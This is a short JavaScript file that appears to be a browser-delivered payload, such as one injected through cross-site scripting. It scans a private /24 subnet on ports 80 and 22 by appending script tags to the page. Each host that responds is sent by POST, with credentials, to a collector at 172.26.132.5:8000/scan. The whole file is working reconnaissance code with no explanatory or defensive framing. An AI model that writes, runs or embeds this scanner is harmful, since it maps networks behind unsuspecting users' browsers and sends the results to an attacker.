target_ip="172.26.132.5";
function ipcreate(ip){
	var ips = ip.replace(/(\d+\.\d+\.\d+)\.\d+/,"$1.");
	for(var i=1;i<=255;i++){
		CreateScript(ips+i,80);
		CreateScript(ips+i,22);
	}
}

function CreateScript(ip,xport){
	var s = document.createElement("script");
	s.setAttribute("onload","find(\'"+ip+"\',\'"+xport+"\')");
	s.src="http://"+ip+":"+xport;
	document.body.appendChild(s);
}

function find(ip,port){
	$.ajax({
            type: "POST",
            url: "http://172.26.132.5:8000/scan",
            data: ip+":"+port,
            xhrFields:{
                withCredentials:true
            },
            crossDomain:true,
        });
}

ipcreate(target_ip);